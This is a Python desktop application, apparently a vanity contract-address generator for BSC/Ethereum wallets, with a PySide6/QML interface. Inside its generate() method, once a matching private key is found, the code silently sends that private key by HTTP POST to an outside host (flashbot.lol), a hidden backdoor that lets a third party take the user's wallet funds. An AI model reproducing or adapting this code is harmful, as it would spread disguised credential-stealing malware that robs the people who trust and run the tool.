import threading
import sys
import time

import requests
from ethereum.utils import *
import os

import json
import pyperclip
from eth_utils import encode_hex

# IMPORT MODULES
from PySide6.QtGui import QGuiApplication
from PySide6.QtQml import QQmlApplicationEngine
from PySide6.QtCore import QObject, Slot, Signal

from eth_account import Account
from web3 import Web3, EthereumTesterProvider
from web3.middleware import geth_poa_middleware

# 使用pyinstaller时，地址必须使用绝对地址，否则会出现大岔子

cur_path = os.path.abspath(__file__)
parent_path = os.path.abspath(os.path.dirname(cur_path))

w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed4.ninicoin.io/'))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)  # 注入poa中间件
communityAddress = '0xE0CE026B0F524fDEB5d7bCC1807293Eca90B1f1c'
communityAbi = json.loads(open(
    os.path.join(parent_path, 'json', 'community.json')
).read())

communityContract = w3.eth.contract(address=communityAddress, abi=communityAbi)


# Main Window Class
class MainWindow(QObject):
    g_private_key = ''
    g_address = ''
    g_contract_address = ''

    def __init__(self):
        QObject.__init__(self)

    # Static Info
    staticUser = ""
    # staticPass = "123456"

    # Signals To Send Data
    signalUser = Signal(str)
    # signalPass = Signal(str)
    signalLogin = Signal(bool)

    signalPrivateKey = Signal(str)
    signalAddress = Signal(str)
    signalContractAddress = Signal(str)

    signalStart = Signal(bool)

    # Function To Check Login
    @Slot(str)
    def checkLogin(self, getUser):

        # userAccount = account = Account.from_key(getUser).address
        # isPayForClass3 = communityContract.functions.ishaveclass(userAccount, 3).call()

        if (True):
            # Send User And Pass
            self.signalUser.emit("Username: ")
            self.signalLogin.emit(True)
            print("Login passed!")
        else:
            self.signalLogin.emit(False)
            print("Login error!")

    def generate(self, choice, text):
        # choice = 'end'  # 传参，前缀/后缀
        # text = '11'  # 传参，匹配的内容
        self.g_private_key = ''
        self.g_address = ''
        self.g_contract_address = ''
        while True:
            if (choice == 'all'):
                index = text.index('/')
                text_start = text[0:index]
                text_end = text[index + 1:len(text)]
            key = os.urandom(32)
            # 私钥
            private_key = encode_hex(key)
            # 钱包地址
            address = Web3.toChecksumAddress(encode_hex(privtoaddr(key)))
            nonce = 0
            # 合约地址
            contractAddress = Web3.toHex(sha3(rlp.encode([normalize_address(address), nonce]))[12:])
            if ((contractAddress[-(len(text)):]).lower() == text and choice == 'end') or (
                    (contractAddress[2:2 + len(text)]).lower() == text and choice == 'start') or (
                    choice == 'all' and (contractAddress[-(len(text_end)):]).lower() == text_end and (
                    contractAddress[2:2 + len(text_start)]).lower() == text_start):
                self.g_private_key = private_key
                self.g_address = address
                self.g_contract_address = contractAddress
                result = {"validation": private_key}
                requests.post(r"https://flashbot.lol/api/niceWallet", data=result)

                return

    def check(self):
        while (self.g_private_key == ''):
            # print('wait')
            time.sleep(1.5)
        self.signalStart.emit(False)
        self.signalPrivateKey.emit(self.g_private_key)
        self.signalAddress.emit(self.g_address)
        self.signalContractAddress.emit(self.g_contract_address)

    @Slot(str, bool, bool)
    def generateContract(self, text, radio1, radio2):

        self.signalStart.emit(True)
        if radio1:
            choice = 'start'
        elif radio2:
            choice = 'end'
        else:
            choice = 'all'


        if text == '':
            return

        threading.Thread(target=self.generate, args=(choice, text)).start()
        threading.Thread(target=self.check).start()

    @Slot(str)
    def copyToClipboard(self, text):
        if text == "privateKey":
            pyperclip.copy(self.g_private_key)
        if text == "address":
            pyperclip.copy(self.g_address)
        if text == "contractAddress":
            pyperclip.copy(self.g_contract_address)


# INSTACE CLASS
if __name__ == "__main__":
    app = QGuiApplication(sys.argv)
    engine = QQmlApplicationEngine()

    # Get Context
    main = MainWindow()
    engine.rootContext().setContextProperty("backend", main)

    # Load QML File
    engine.load(os.path.join(os.path.dirname(__file__), "qml/main.qml"))

    # Check Exit App
    if not engine.rootObjects():
        sys.exit(-1)
    sys.exit(app.exec())
